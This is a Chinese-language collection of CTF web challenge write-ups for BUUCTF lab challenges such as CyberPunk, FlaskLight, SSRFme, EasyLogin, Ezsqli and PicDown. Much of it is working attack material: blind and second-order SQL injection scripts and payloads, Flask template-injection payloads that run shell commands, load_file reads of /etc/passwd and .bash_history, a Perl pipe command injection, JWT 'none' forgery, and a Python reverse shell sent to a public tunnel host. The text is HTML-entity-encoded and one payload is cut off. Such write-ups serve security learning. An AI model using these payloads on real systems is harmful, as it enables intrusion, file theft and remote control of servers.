$path&#x3D;str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path); $result&#x3D;mysqli_query($con,&quot;select * from images where id&#x3D;&#39;&#123;$id&#125;&#39; or path&#x3D;&#39;&#123;$path&#125;&#39;&quot;); $row&#x3D;mysqli_fetch_array($result,MYSQLI_ASSOC); $path&#x3D;&quot;.&#x2F;&quot; . $row[&quot;path&quot;]; header(&quot;Content-Type: image&#x2F;jpeg&quot;); readfile($path); GET方式传入变量id的值，若没有则为1GET方式传入变量path的值，若没有则为空addslashes() 函数返回在预定义字符之前添加反斜杠的字符串，单引号（&#39;）、双引号（&quot;）、反斜杠（\\）str_replace()函数将两个变量内的\\0、%00、&#39;、&#39;都替换为空将变量$id与$path拼接进SQL语句脚本： import requests url &#x3D; &quot;http:&#x2F;&#x2F;f99fde09-be38-4b5a-bea6-2362fb4115e4.node4.buuoj.cn:81&#x2F;image.php?id&#x3D;\\\\0&#39;&amp;path&#x3D;&quot; payload1 &#x3D; r&quot;or ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125; --+&quot; payload2 &#x3D; r&quot;or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot; payload3 &#x3D; r&quot;or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name &#x3D; 0x7573657273),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot; payload4 &#x3D; r&quot;or ascii(substr((select password from users),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot; database &#x3D; &quot;&quot; for i in range(1,1000): low &#x3D; 32 high &#x3D; 128 mid &#x3D; (low + high) &#x2F;&#x2F; 2 while(low &lt; high): payload &#x3D; payload4.format(i,mid) new_url &#x3D; url + payload r &#x3D; requests.get(new_url) if &quot;JFIF&quot; in r.text: low &#x3D; mid + 1 else: high &#x3D; mid mid &#x3D; (low + high) &#x2F;&#x2F; 2 if (mid &#x3D;&#x3D; 32 or mid &#x3D;&#x3D; 128): break database +&#x3D; chr(mid) print(database) 得到密码和用户名登录 登录后是个文件上传的页面 这里要用文件名传一句话木马 在上传后的目录可以看到上传的文件名但是不能访问上传文件的内容 不能用php就用短标签代替 [CISCN2019 华北赛区 Day1 Web5]CyberPunk第一次遇见二次注入的题，正好学一下 源码里有个file，猜测有文件包含，可以利用伪协议读取这几个页面的源码 change.php页面 &lt;?php require_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])) &#123; $msg &#x3D; &#39;&#39;; $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;; $user_name &#x3D; $_POST[&quot;user_name&quot;]; $address &#x3D; addslashes($_POST[&quot;address&quot;]); $phone &#x3D; $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; $msg &#x3D; &#39;no sql inject!&#39;; &#125;else&#123; $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;; $fetch &#x3D; $db-&gt;query($sql); &#125; if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123; $row &#x3D; $fetch-&gt;fetch_assoc(); $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;]; $result &#x3D; $db-&gt;query($sql); if(!$result) &#123; echo &#39;error&#39;; print_r($db-&gt;error); exit; &#125; $msg &#x3D; &quot;订单修改成功&quot;; &#125; else &#123; $msg &#x3D; &quot;未找到订单!&quot;; &#125; &#125;else &#123; $msg &#x3D; &quot;信息不全&quot;; &#125; 主要的漏洞点就在change.php 因为其他输入位置过滤的太多，基本能注入的都被过滤了，所以只能利用address 在创建address时虽然对输入的数据进行了addslashes过滤 但之后还会对旧address进行一次sql查询 因此可以利用二次注入，再结合报错注入，和load_file函数读取flag文件 在创建时在地址中输入注入语句 1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,20)),0x7e),1)# 1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),21,50)),0x7e),1)# （这里之所以要看flag.txt根据师傅们的博客推测是纯靠猜的 在修改地址的时候就会重新调用这个sql语句，报错输出flag [CSCCTF 2019 Qual]FlaskLight一眼ssti，然后就不会了（ f12看到源码注释，get方式，参数为search 试一下传49确定是ssti config 也是 Flask模版中的一个全局对象,它包含了所有应用程序的配置值。 &#123;&#123; config.items() &#125;&#125; &#x2F;&#x2F; 查看配置项目的信息 例一：warnings.catch_warnings类 &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125; PS：由于使用[‘globals’]会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式[‘glo’+&#39;bals’] 最后获取flag &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek &#39;).read()&quot;)&#125;&#125; 例二： class’site._Printer’类 &#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125; 获取flag &#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;).read()&#125;&#125; 例三：popen &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;, [RCTF2015]EasySQL这也是个二次注入 注册后登录再修改密码 利用报错注入 ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))# ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;))),1))# ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(flag))from(flag))),1))# 离谱，被骗了 重新查表 ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1))# 这一看就是没输出全 ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users))),1))# ？？？ 这个字段里加了一堆没用的数据 只能用正则regexp过滤一下 ethe&quot;||updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1)# 还是没输出全 之后就要用逆序输出了 ethe&quot;||updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1)# [HITCON 2017]SSRFme进去后是php代码 直接抄的其他师傅的注释 &lt;?php if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123; $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]); &#x2F;&#x2F; explode(separator,string)函数把以separator为分隔字符串将字符串打散为数组。 $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $http_x_headers[0]; &#125; echo $_SERVER[&quot;REMOTE_ADDR&quot;]; $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); &#x2F;&#x2F; “REMOTE_ADDR”为正在浏览当前页面用户的 IP 地址。 @mkdir($sandbox); @chdir($sandbox); &#x2F;&#x2F; 改变当前的目录到$sandbox $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); &#x2F;&#x2F; escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数 $info &#x3D; pathinfo($_GET[&quot;filename&quot;]); &#x2F;&#x2F; pathinfo() 函数以数组的形式返回文件路径的信息。 $dir &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;])); &#x2F;&#x2F; basename() 函数返回路径中的文件名部分。 @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[&quot;basename&quot;]), $data); highlight_file(__FILE__); &#x2F;&#x2F; 以上代码大致为，调用GET（git）命令来执行从url获取的参数，从该url获取内容， 然后按照filename新建文件，写入git到的结果。 简单来说就是利用传参中的url执行命令，然后将结果保存在filename中 有几个地方不太懂 ​ 1.百度的wp都说这里利用的perl脚本里的open漏洞 利用GET中的open函数漏洞。 open函数在GET命令被调用时执行，也就是第五行执行GET命令时，perl语言会调用open命令，漏洞就存在于open命令对于文件的处理上，关于这个漏洞，外国人有文章，是这样写的：Perl saw that your “file” ended with a “pipe” (vertical bar) character. So it interpreted the “file” as a command to be executed, and interpreted the command’s output as the “file”&#39;s contents. The command is “who” (which prints information on currently logged-in users). If you execute that command, you will see that the output is exactly what the Perl program gave you. 翻译过来意思是 perl函数看到要打开的文件名中如果以管道符（键盘上那个竖杠）结尾，就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行，并且将命令的执行结果作为这个文件的内容写入。这个命令的执行权限是当前的登录者。如果你执行这个命令，你会看到perl程序运行的结果。 ​ 2.这里执行url传入的命令的前提是要求有个以该命令命名的文件 ?url=/&amp;filename=1.txt 看一下根目录 有两个和flag有关的文件，试flag无果，只能试试readflag ?url=&amp;filename=bash -c /readflag| 先创建一个bash -c /readflag|的文件 ?url=file:bash -c /readflag|&amp;filename=bash -c /readflag| 利用url执行命令 /sandbox/md5值/bash -c /readflag| [FBCTF2019]RCEService json格式 cmd 可以猜到执行命令格式是 {&quot;cmd&quot;:&quot;ls&quot;} 还可以直接get参数进去 但是cat参数没法直接用，还有过滤，不过可以用换行符绕过过滤 &lt;?php putenv(&#39;PATH=/home/rceservice/jail&#39;); 设置了环境变量的PATH，导致不能使用相对路径，只能用绝对路径： if (isset($_REQUEST[&#39;cmd&#39;])) &#123; $json = $_REQUEST[&#39;cmd&#39;]; if (!is_string($json)) &#123; echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;; &#125; elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/&#39;, $json)) &#123; echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;; &#125; else &#123; echo &#39;Attempting to run command:&lt;br/&gt;&#39;; $cmd = json_decode($json, true)[&#39;cmd&#39;]; if ($cmd !== NULL) &#123; system($cmd); &#125; else &#123; echo &#39;Invalid input&#39;; &#125; echo &#39;&lt;br/&gt;&lt;br/&gt;&#39;; &#125; &#125; ?&gt; cat命令不能用，原因可能是当前的PATH下没有cat，这里需要也需要用绝对路径： Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用 cat 读出源码（我也很想知道网上的wp没源码之前怎么想到这么绕过的 然后找flag在的目录 找到之后利用cat读出来 [网鼎杯 2018]Comment有git泄露，用githack跑一遍，然后利用git log --reflog查看历史提交，再利用git reset回滚版本，得到原始的代码 &lt;?php include &quot;mysql.php&quot;; session_start(); if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123; header(&quot;Location: .&#x2F;login.php&quot;); die(); &#125; if(isset($_GET[&#39;do&#39;]))&#123; switch ($_GET[&#39;do&#39;]) &#123; case &#39;write&#39;: $category &#x3D; addslashes($_POST[&#39;category&#39;]); $title &#x3D; addslashes($_POST[&#39;title&#39;]); $content &#x3D; addslashes($_POST[&#39;content&#39;]); $sql &#x3D; &quot;insert into board set category &#x3D; &#39;$category&#39;, title &#x3D; &#39;$title&#39;, content &#x3D; &#39;$content&#39;&quot;; $result &#x3D; mysql_query($sql); header(&quot;Location: .&#x2F;index.php&quot;); break; case &#39;comment&#39;: $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]); $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;; $result &#x3D; mysql_query($sql); $num &#x3D; mysql_num_rows($result); if($num&gt;0)&#123; $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;]; $content &#x3D; addslashes($_POST[&#39;content&#39;]); $sql &#x3D; &quot;insert into comment set category &#x3D; &#39;$category&#39;, content &#x3D; &#39;$content&#39;, bo_id &#x3D; &#39;$bo_id&#39;&quot;; $result &#x3D; mysql_query($sql); &#125; header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;); break; default: header(&quot;Location: .&#x2F;index.php&quot;); &#125; &#125; else&#123; header(&quot;Location: .&#x2F;index.php&quot;); &#125; ?&gt; 输入的内容都被addslashes过滤了，但是再comment部分，category是直接从数据库中调出来的，也就是说这里存在二次注入 在发帖部分：的category里输入x&#39;,content=database(),/* 再在提交留言里 这样可以形成多行注释，注释掉原有的content字段 可以得到数据库名称 这时查询语句为 $sql &#x3D; &quot;insert into comment set category &#x3D; &#39;x&#39;,content&#x3D;database(),&#x2F;*&#39;, content &#x3D; &#39;*&#x2F;#&#39;, bo_id &#x3D; &#39;$bo_id&#39;&quot;; 即 $sql &#x3D; &quot;insert into comment set category &#x3D; &#39;x&#39;,content&#x3D;database(), bo_id &#x3D; &#39;$bo_id&#39;&quot;; SQL读取文件用load_file()函数进行读取，值得注意的是读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。 该文件所有字节可读，但文件内容必须小于max_allowed_packet。如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。 .bash_history .bash_history为在unix/linux系统下保存历史命令的文件，在用户的根目录下，即~/处。 .DS_Store文件泄露 文件泄露，有一个下载至本地的脚本，不过这题用不上。 在发帖之前还有个登录界面，用户名和密码前几位直接给了，剩下三位爆破得到666 &#39;,content=(select(load_file(&quot;/etc/passwd&quot;))),/* （我也不知道查这里的目的是什么，但是百度其他师傅的wp都有这步 应该是为了知道.bash_histroy文件的路径 &#39;,content=(select(load_file(&quot;/home/www/.bash_history&quot;))),/* 接着再查.DS_Store &#39;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/* 为了使其全部显示，要用hex编码 然后解码 看见有个flag文件 读一下 &#39;,content=(select hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;))),/* 再解码，拿到flag [HFCTF2020]EasyLogin注册个账号，登录，看到有个getflag但是提示权限不够 查看源码发现全是js的 看一下app.js &#x2F;** * 或许该用 koa-static 来处理静态文件 * 路径该怎么配置？不管了先填个根目录XD *&#x2F; function login() &#123; const username &#x3D; $(&quot;#username&quot;).val(); const password &#x3D; $(&quot;#password&quot;).val(); const token &#x3D; sessionStorage.getItem(&quot;token&quot;); $.post(&quot;&#x2F;api&#x2F;login&quot;, &#123;username, password, authorization:token&#125;) .done(function(data) &#123; const &#123;status&#125; &#x3D; data; if(status) &#123; document.location &#x3D; &quot;&#x2F;home&quot;; &#125; &#125;) .fail(function(xhr, textStatus, errorThrown) &#123; alert(xhr.responseJSON.message); &#125;); &#125; function register() &#123; const username &#x3D; $(&quot;#username&quot;).val(); const password &#x3D; $(&quot;#password&quot;).val(); $.post(&quot;&#x2F;api&#x2F;register&quot;, &#123;username, password&#125;) .done(function(data) &#123; const &#123; token &#125; &#x3D; data; sessionStorage.setItem(&#39;token&#39;, token); document.location &#x3D; &quot;&#x2F;login&quot;; &#125;) .fail(function(xhr, textStatus, errorThrown) &#123; alert(xhr.responseJSON.message); &#125;); &#125; function logout() &#123; $.get(&#39;&#x2F;api&#x2F;logout&#39;).done(function(data) &#123; const &#123;status&#125; &#x3D; data; if(status) &#123; document.location &#x3D; &#39;&#x2F;login&#39;; &#125; &#125;); &#125; function getflag() &#123; $.get(&#39;&#x2F;api&#x2F;flag&#39;).done(function(data) &#123; const &#123;flag&#125; &#x3D; data; $(&quot;#username&quot;).val(flag); &#125;).fail(function(xhr, textStatus, errorThrown) &#123; alert(xhr.responseJSON.message); &#125;); &#125; 提示是基于Node.js的koa框架，但是这个页面的代码并不是逻辑代码，用处不大。在注释里提示静态文件处理出现问题，那么可能会出现任意文件读取漏洞 这里需要对koa框架的目录有一定的了解 访问一下controllers路径下的api.js 额，这里赵总说是经验。。。 const crypto &#x3D; require(&#39;crypto&#39;); const fs &#x3D; require(&#39;fs&#39;) const jwt &#x3D; require(&#39;jsonwebtoken&#39;) const APIError &#x3D; require(&#39;..&#x2F;rest&#39;).APIError; module.exports &#x3D; &#123; &#39;POST &#x2F;api&#x2F;register&#39;: async (ctx, next) &#x3D;&gt; &#123; const &#123;username, password&#125; &#x3D; ctx.request.body; if(!username || username &#x3D;&#x3D;&#x3D; &#39;admin&#39;)&#123; throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;); &#125; if(global.secrets.length &gt; 100000) &#123; global.secrets &#x3D; []; &#125; const secret &#x3D; crypto.randomBytes(18).toString(&#39;hex&#39;); const secretid &#x3D; global.secrets.length; global.secrets.push(secret) const token &#x3D; jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;); ctx.rest(&#123; token: token &#125;); await next(); &#125;, &#39;POST &#x2F;api&#x2F;login&#39;: async (ctx, next) &#x3D;&gt; &#123; const &#123;username, password&#125; &#x3D; ctx.request.body; if(!username || !password) &#123; throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;); &#125; const token &#x3D; ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid &#x3D; JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid; console.log(sid) if(sid &#x3D;&#x3D;&#x3D; undefined || sid &#x3D;&#x3D;&#x3D; null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;&#x3D; 0)) &#123; throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;); &#125; const secret &#x3D; global.secrets[sid]; const user &#x3D; jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;); const status &#x3D; username &#x3D;&#x3D;&#x3D; user.username &amp;&amp; password &#x3D;&#x3D;&#x3D; user.password; if(status) &#123; ctx.session.username &#x3D; username; &#125; ctx.rest(&#123; status &#125;); await next(); &#125;, &#39;GET &#x2F;api&#x2F;flag&#39;: async (ctx, next) &#x3D;&gt; &#123; if(ctx.session.username !&#x3D;&#x3D; &#39;admin&#39;)&#123; throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;); &#125; const flag &#x3D; fs.readFileSync(&#39;&#x2F;flag&#39;).toString(); ctx.rest(&#123; flag &#125;); await next(); &#125;, &#39;GET &#x2F;api&#x2F;logout&#39;: async (ctx, next) &#x3D;&gt; &#123; ctx.session.username &#x3D; null; ctx.rest(&#123; status: true &#125;) await next(); &#125; &#125;; 赵总wp里的审计: 注册 /api/register，接受传入的 username 和 password，先判断 username 不为 admin，然后生成一个 key 来以这些信息为依据，生成一个 jwt 令牌，key 同时存入全局数组。 登录 /api/login，接受传入的 username 和 password，然后从令牌的信息段中取 key 的 id，从程序中的全局数组取出 key，然后进行验证，验证通过之后置 session 中的 username 为登录时使用的 username。 获取FLAG /api/flag，判断 session 中的用户名是否为 admin，是的话就直接给 flag。 可以看到信息是用 jwt 令牌储存的，使用 jsonwebtoken 库来操作，这里用的是 HS256加密，但经过测试发现，当加密时使用的是 none 方法，验证时只要密钥处为 undefined 或者空之类的，即便后面的算法指名为 HS256，验证也还是按照 none 来验证通过，这样很轻松地就可以伪造一个 username 为 admin 的 jwttoken 了。 在登录界面抓包后边这串就是jwt（当时忘了截图，这是改完jwt之后的了 之后在JSON Web Tokens - jwt.io里解码 接下来也是赵总的分析： 回到源程序逻辑中，若想让这里的密钥 key为空，就需要修改上面的 secretid。那么就尝试修改 secretid，使其无法作为全局变量 secrets 数组的索引，那么 secret 就会为空了。 注意，这里还有一个验证，要求 sid 不能为 undefined，null，并且必须在全局变量 secrets 数组的长度和 0 之间。乍看之下没有操作空间，怎么整都会取出 密钥 key。但别忘了 JavaScript 是一门弱类型语言，NodeJS 都是 JS 的语法，那自然也是咯。所以我们只要选择恰当的数据来绕过这个判断即可。可以做一个小实验来验证我们的想法。 一个小实验，空数组与数字比较永远为真，当然用空字符串之类的也可以 最后利用python的PyJWT库来加密 抓包再放包就可以读取这个flag 虎符 CTF Web 部分 Writeup – glzjin (zhaoj.in) [GYCTF2020]Ezsqlior被过滤了，没法用information查表了，但是可以用 1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),1,1))&#x3D;103 2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;.format() 正确的时候返回Nu1L，错误时返回V&amp;N 爆表脚本 import requests url &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;&quot; payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39; database&#x3D; &#39;&#39; for i in range(1,1000): low &#x3D; 32 heigh &#x3D; 128 mid &#x3D; (low + heigh) &#x2F;&#x2F; 2 while (low &lt; heigh): payload1 &#x3D; payload.format(i,mid) post_data &#x3D; &#123;&#39;id&#39;: payload1&#125; r &#x3D; requests.post(url,data&#x3D;post_data) print(payload1) if &quot;Nu1L&quot; in r.text: low &#x3D; mid + 1 else: heigh &#x3D; mid mid &#x3D; (low + heigh) &#x2F;&#x2F; 2 if mid &#x3D;&#x3D; 32: break database +&#x3D;chr(mid) print(database) 得到表名后，拿不到列名，这里可以用无列名注入 先贴payload 2||((select 1,&quot;{}&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh)) 采用了字符偏移 按位去比较，如果爆破字符与flag的第一个字符相等，就向后继续，大了小了都要继续当前的循环，直到找到合适的字符 所以最后的mid要减一才是正确的字符 这里我们传入十六进制，mysql会自动将十六进制转为字符 mysql不区分大小写，比较的时候O(0x4f)的ascii比f(0x66)的ascii小，但是比较的结果是O比f大 这里要和flag的表的列数一样 最后跑一下拿flag import requests url &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;index.php&quot; #payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39; payload &#x3D; &#39;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#39; change &#x3D; &#39;&#39; database&#x3D; &#39;&#39; for j in range(1,100): for i in range(32,128): change &#x3D; database+chr(i) payload1 &#x3D; payload.format(change) print(payload1) data &#x3D; &#123;&#39;id&#39;: payload1&#125; r &#x3D; requests.post(url,data&#x3D;data) if &#39;Nu1L&#39; in r.text: database +&#x3D; chr(i-1) print(database) break [b01lers2020]Welcome to Earth抓包之后一直往下走 源码里找不到就去看js 最后可以找到一个 随机排列组合得到flag from itertools import permutations flag &#x3D; [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;] item &#x3D; permutations(flag)#对flag全排列，返回的是iterators（迭代器） for i in item: k &#x3D; &#39;&#39;.join(i)#join连接成为字符串 if k[-1] &#x3D;&#x3D;&#39;&#125;&#39; and k[0:13] &#x3D;&#x3D; &#39;pctf&#123;hey_boys&#39;:&#x2F;&#x2F;这里还可以用python的startswich方法判断是否是pctf&#123;hey开头 &#x2F;&#x2F;if k.startswith(&#39;pctf&#123;hey_boys&#39;) and k[-1] &#x3D;&#x3D;&#39;&#125;&#39;: print(k) [watevrCTF-2019]Cookie Store抓session，base64解码把金额改成100，放包 [网鼎杯 2020 白虎组]PicDown 源码没东西，只有个url的get参数，还以为是ssrf之类的，搜了下wp，这里可能是因为环境原因，有个非预期解 非预期解： 有文件读取，直接url=/flag就能下载一个beautiful.jpg,改成txt就能看见flag 预期解： /proc/self/目录的意义 我们都知道可以通过/proc/$pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。 读一下app.py url=app.py from flask import Flask, Response from flask import render_template from flask import request import os import urllib app &#x3D; Flask(__name__) SECRET_FILE &#x3D; &quot;&#x2F;tmp&#x2F;secret.txt&quot; f &#x3D; open(SECRET_FILE) SECRET_KEY &#x3D; f.read().strip() os.remove(SECRET_FILE) @app.route(&#39;&#x2F;&#39;) def index(): return render_template(&#39;search.html&#39;) @app.route(&#39;&#x2F;page&#39;) def page(): url &#x3D; request.args.get(&quot;url&quot;) try: if not url.lower().startswith(&quot;file&quot;): res &#x3D; urllib.urlopen(url) value &#x3D; res.read() response &#x3D; Response(value, mimetype&#x3D;&#39;application&#x2F;octet-stream&#39;) response.headers[&#39;Content-Disposition&#39;] &#x3D; &#39;attachment; filename&#x3D;beautiful.jpg&#39; return response else: value &#x3D; &quot;HACK ERROR!&quot; except: value &#x3D; &quot;SOMETHING WRONG!&quot; return render_template(&#39;search.html&#39;, res&#x3D;value) @app.route(&#39;&#x2F;no_one_know_the_manager&#39;) def manager(): key &#x3D; request.args.get(&quot;key&quot;) print(SECRET_KEY) if key &#x3D;&#x3D; SECRET_KEY: shell &#x3D; request.args.get(&quot;shell&quot;) os.system(shell) res &#x3D; &quot;ok&quot; else: res &#x3D; &quot;Wrong Key!&quot; return res if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.run(host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;8080) 可以看到no_one_know_the_manager中要匹配SECRET_KEY，然后执行shell，但是SECRET_KEY所在的secret.txt被删掉了 但是这个文件是用open打开的，会创建文件描述符。 我们读这个文件描述符中的内容就好了此处可以通过/proc/pid/fd/读取，这个目录包含了进程打开的每一个文件的链接 拿到key的内容，要url编码，但是shell执行的命令不会返回，这里使用反弹shell的方式，在根目录下读取flag nmd弹了几个小时终于弹tan出来了 这玩意要公网ip，搜了一圈没一个说这个事的， 没公网ip，搞了个端口映射后的公网 (23条消息) 端口映射后的公网反弹shell_来到了学渣的博客-CSDN博客 https://natapp.cn/register 把本地的8082端口映射到公网 把这个payload当shell参数的值打进去 python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;server.natappfree.cc&#39;,xxxxx));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot; 然后在Ubuntu里监听8082端口，从根目录里找到flag 泪目 [SWPUCTF 2018]SimplePHP文件上传，但是这个flie参数感觉可以直接文件读取 index.php &lt;?php header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;); include &#39;base.php&#39;; ?&gt; base.php &lt;?php session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;web3&lt;&#x2F;title&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot;&gt; &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;jquery&#x2F;2.1.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;&#x2F;head&gt; 